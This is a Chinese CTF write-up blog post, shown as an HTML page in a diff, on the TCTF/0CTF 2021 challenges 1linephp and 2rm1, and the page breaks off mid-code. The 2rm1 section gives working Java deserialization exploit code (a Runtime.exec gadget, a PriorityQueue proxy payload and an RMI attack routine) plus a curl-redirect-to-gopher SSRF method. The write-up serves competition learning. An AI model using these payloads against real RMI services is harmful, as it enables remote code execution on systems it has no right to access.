@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="TCTF&#x2F;0CTF至尊难，认认真真搞了一天一个题都做不出来，虽然做出来题的队伍不多，但是我还是太垃圾了呜呜 赛后复现了2rm1，其中绝大多数的代码都是参考的rmb神仙，还超级提问麻烦了他几天，表示感谢 1linephp搜了一下发现了orange在18年给hitcon出的题目HITCON CTF 2018 - One Line PHP Challenge唯一的差距就是把之前无限制的文件名加">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF&#x2F;0CTF">
+<meta property="og:url" content="https://blog.z3ratu1.cn/TCTF.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="TCTF&#x2F;0CTF至尊难，认认真真搞了一天一个题都做不出来，虽然做出来题的队伍不多，但是我还是太垃圾了呜呜 赛后复现了2rm1，其中绝大多数的代码都是参考的rmb神仙，还超级提问麻烦了他几天，表示感谢 1linephp搜了一下发现了orange在18年给hitcon出的题目HITCON CTF 2018 - One Line PHP Challenge唯一的差距就是把之前无限制的文件名加">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-07-03T13:28:31.000Z">
+<meta property="article:modified_time" content="2021-07-20T11:47:35.780Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="RMI">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/TCTF.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>TCTF/0CTF | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/TCTF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCTF/0CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-03 21:28:31" itemprop="dateCreated datePublished" datetime="2021-07-03T21:28:31+08:00">2021-07-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-07-20 19:47:35" itemprop="dateModified" datetime="2021-07-20T19:47:35+08:00">2021-07-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/TCTF.html" class="post-meta-item leancloud_visitors" data-flag-title="TCTF/0CTF" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/TCTF.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/TCTF.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="TCTF-x2F-0CTF"><a href="#TCTF-x2F-0CTF" class="headerlink" title="TCTF&#x2F;0CTF"></a>TCTF&#x2F;0CTF</h1><p>至尊难，认认真真搞了一天一个题都做不出来，虽然做出来题的队伍不多，但是我还是太垃圾了呜呜</p>
+<p>赛后复现了2rm1，其中绝大多数的代码都是参考的rmb神仙，还超级提问麻烦了他几天，表示感谢</p>
+<h2 id="1linephp"><a href="#1linephp" class="headerlink" title="1linephp"></a>1linephp</h2><p>搜了一下发现了orange在18年给hitcon出的题目<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html">HITCON CTF 2018 - One Line PHP Challenge</a><br>唯一的差距就是把之前无限制的文件名加了一个.php后缀。难度提升</p>
+<p>给了phpinfo，简单看了看没发现什么特殊点，感觉和default的差不多，upload progress开着，可以考虑用这个打一波<br>orange的题目是没有后缀限制所以可以直接upload progress包含对应的文件，phpinfo里面开了url_fopen，但是没开url_include，远程包含全部木大<br>本地包含我只能想到upload progress，然后PHP后缀只能拿zip或者phar这里打包的协议来绕</p>
+<p>但问题和orange这个题是一样的，session中会自带垃圾数据，不论是phar还是zip都会被垃圾数据影响从而无法解析，orange可以用filter反复base64decode把所有垃圾数据清理，我尝试重复这样的操作，却发现zip协议和phar协议并不能在里面再套一层php:&#x2F;&#x2F;filter。计划破产<br>试了试把resource放到前面，过滤器放到后面，也不行，呜呜<br>改了改php.ini的upload progress cleanup想拿到一个upload progress的文件看一眼，但是不知道为什么没成功，为此浪费了好久。。。并且阿里云的机子想跑payload经常会因为奇怪的原因把我ban了，还是虚拟机好用。。。然后转到虚拟机，物理机能ping通虚拟机但是访问不上页面是什么玩意呢。怎么坑越踩越多，崩了崩了</p>
+<p><strong>update:</strong> 好了，虚拟机修好了，虚拟机ping的通访问不上，且虚拟机内能通过自己局域网ip访问到自己，99%是防火墙的问题，Ubuntu一般来说防火墙叫ufw，那个东西已经被我持续长久的关掉了，但是这次不知道是从哪又冒出来一个firewalld，搜了半天发现是这么个玩意，关了之后瞬间通</p>
+<h3 id="看wp"><a href="#看wp" class="headerlink" title="看wp"></a>看wp</h3><p>又到了我最喜欢的看wp环节，出题人的官方wp已经出来辣，虽然在这之前已经和CNSS的好姐姐进行了一波交流，得知了她的一个解，今天wp出来发现那是一个非预期，真是太强了呜呜，我太垃圾了<br>然后尝试着去硬看PHP源码，结果发现PHP源码调的是libc的库，然后libc的库没看就看不懂了，暂时告一段落</p>
+<p>预期解是利用了libc对zip的解析方式，通过修改zip格式来实现解析，而非预期同样用一个比较简单的方式解决了这个问题，总而言之，一开始的思路是正确的，可惜的是我没有把握是不是一定对而没有过多的深究，思考的方向也不在解析上，呜呜呜，其实从一开始似乎就是在正确的道路上啊<br>出题人的wp</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021/1linephp/writeup">1linephp_writeup</a></p>
+<h2 id="2rm1"><a href="#2rm1" class="headerlink" title="2rm1"></a>2rm1</h2><p>是个java题，出于实在不知道该干什么而尝试进行java入门看的。能看出来应该是打一个RMI 反序列化。<br>给了三个部分，Server，Client，还有一个spider，翻翻docker-compose.yml，spider是我们可以访问到的，接受一个url，用<code>curl -L</code>发请求，并且输入的url必须以<code>https://</code>开头，server和client在内网里面，server本身也是registry，flag在client上<br>spider和client用spring boot起的web服务，可以接受get提交的参数发送对应的请求。<br>client和server的主要代码就是一套经典的RMI模板，并且之间传的参数也都是string，似乎不能直接反序列化，但是之前有看seebug一篇文章上将可以通过java agent或者其他的注入方法，将序列化的数据替换，也能实现传参基本类型的情况下完成反序列化</p>
+<h3 id="奇怪的前置知识"><a href="#奇怪的前置知识" class="headerlink" title="奇怪的前置知识"></a>奇怪的前置知识</h3><p>docker-compose中每个docker的那个名字就是docker在环境里的主机名，一开始我还以为要用spider去猜，而docker网桥的内网环境ip地址段较为固定，可以通过穷举去猜测。然后rmb告诉我那个就是主机名，远程通信的时候直接填这个主机名就可以了。。。呜呜呜我真不知道，我是废物</p>
+<h3 id="curl-ssrf"><a href="#curl-ssrf" class="headerlink" title="curl ssrf"></a>curl ssrf</h3><p><code>man curl</code>翻了翻-L这个参数是干什么的，发现就是支持重定向。那这个意图也太明显了<br>肯定是先curl访问https然后重定向打内网ssrf<br>可以直接ssrf client，让client调用server的hello方法，但是没什么用。<br>考虑一下ssrf时还有一个常用的协议，gopher，通过发送原生tcp流就能通过巧妙的构造进行任意协议的发送<br>经过测试发现原来curl支持重定向的时候，连协议都能进行改变。因此可以直接在vps上放一个重定向然后直接打gopher协议</p>
+<p>因为RMI调用和HTTP协议差不多，之间并没有先握手再通信之类的交互过程，就是用户发一个包服务器回一个包，所以能够用gopher简单的发原始tcp流量进行攻击。</p>
+<h3 id="攻击server"><a href="#攻击server" class="headerlink" title="攻击server"></a>攻击server</h3><p>简单看一下dockerfile内容，发现Spider的jdk版本很高，而server和client均为jkd8u232，似乎刚好是registry拉满防御的那一个版本，因此并不能通过打registry来完成攻击<br>但是server和registry是同一台机器，可以考虑通过攻击server来控制目标主机。server只提供了一个以String为参数的方法供使用，因此不能简单地进行攻击，但对于接受非基本类型参数的方法的攻击在网络上已经出现了很多文章了，可以通过魔改代码等方式在接收类是非基本类型的时候硬发一个Object上去反序列化，而对于String的过滤是jdk8u242，因此这里的版本刚好能用。</p>
+<p>抄了出题人的工具，把AttackServerByNonPrimitiveParameter中的payload直接魔改成这个题里面的gadget</p>
+<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>题目的gadget</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>yxxx<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gadget</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">Gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>实现了InvocationHandler，且有一个invoke方法，可以把这个类作为一个代理类使用，而这里这个代理函数的效果就是无论你调用啥方法我都直接拿着你第一个参数exec</p>
+<p>由于完全没有积累，并不知道怎么去摸出来一个反序列化过程能进行一个调用操作，这里抄rmb神仙的wp</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">genePayload</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        Comparator c <span class="token operator">=</span> <span class="token punctuation">(</span>Comparator<span class="token punctuation">)</span>
+                Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Comparator<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>yxxx<span class="token punctuation">.</span>Gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token annotation punctuation">@Override</span>
+            <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>Object o<span class="token punctuation">,</span> Object t1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field field <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> pq<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>用常见的PriorityQueue整了一个链，前半段和CC2的触发环节差不多，在siftDownUsingComparator函数中，进行了<code>comparator.compare(x, (E) c)</code>这么一个操作，调用了comparator的compare方法。在CC2中是令comparator为TransformingComparator，然后这个类的compare方法中调用了其transformer属性的transform方法，步入正轨，而这里我们直接把他的comparator赋值成我们的代理类，这样子在这里对字符串进行比较的时候，直接拿着这个字符串进行exec</p>
+<h4 id="攻击RMIserver"><a href="#攻击RMIserver" class="headerlink" title="攻击RMIserver"></a>攻击RMIserver</h4><p>接下来就是怎么样打远端了，经过长时间的踩坑，看工具的源码等操作，我得出了如下几点结论<br>RMI调用分为两个阶段，lookup和call，需要先lookup从registry那里拿一个stub回来，再分析这个stub得到server相关信息，进而向server发起调用。<br>其中，lookup和call是分开的，这其间的通信就如同HTTP一样，是我发一个包你回一个包，因此可以通过gopher协议来先进行查询，再进行调用</p>
+<p>lookup的请求是可以重放的，且只要方法绑定在registry上的name和方法的signature和本地的一致，就能通过重放本地流量的方式完成lookup的请求。<br>至于怎么算方法的signature，随便搜搜就有了<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://stackoverflow.com/questions/8066253/compute-a-java-functions-signature/8066268">Compute a Java function’s signature</a><br>但是就算是完全一样的代码，在不同的机器上可能会因为生成的objid等原因导致lookup的结果并不一样，所以对应不同的环境还是要重新stub。</p>
+<p>先手打一下本地，把lookup的请求流量存下来，放vps上整个页面用gopher进行内网ssrf。<br>然后再curl一下把得到的lookup返回的stub存到本地，魔改一下代码，把工具中attack函数中的第一个exploit函数改成直接读存到本地的stub文件，然后把得到的server提供服务的端口拿到</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String filename<span class="token punctuation">,</span> <span class="token keyword">int</span> registryPort<span class="token punctuation">,</span> String lookupName<span class="token punctuation">,</span> String methodSignature<span class="token punctuation">,</span> Object payloadObject<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        ObjID objID_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//Lookup</span>
+        <span class="token comment" spellcheck="true">// byte[] returnData = Stub.exploit(registryHost, registryPort, lookupName, objID_, 2, 4905912898345647071L);</span>
+
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> returnData <span class="token operator">=</span> <span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token string">"lookup.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// System.out.print(Arrays.toString(returnData));</span>
+        <span class="token keyword">int</span> index <span class="token operator">=</span> KMPMatch<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>returnData<span class="token punctuation">,</span> <span class="token string">"UnicastRef"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> serializationData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">+</span>returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0xac</span><span class="token punctuation">;</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0xed</span><span class="token punctuation">;</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x05</span><span class="token punctuation">;</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0x77</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// TC_BLOCKDATA</span>
+        serializationData<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Length</span>
+        System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>returnData<span class="token punctuation">,</span> index<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span> serializationData<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> returnData<span class="token punctuation">.</span>length<span class="token operator">-</span>index<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ByteArrayInputStream byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>serializationData<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectInputStream objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String tcp_host <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readUTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> tcp_port <span class="token operator">=</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>tcp_port<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjID objID <span class="token operator">=</span> ObjID<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>objectInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">long</span> hash <span class="token operator">=</span> ComputeMethodHash<span class="token punctuation">.</span><span class="token function">computeMethodHash</span><span class="token punctuation">(</span>methodSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>
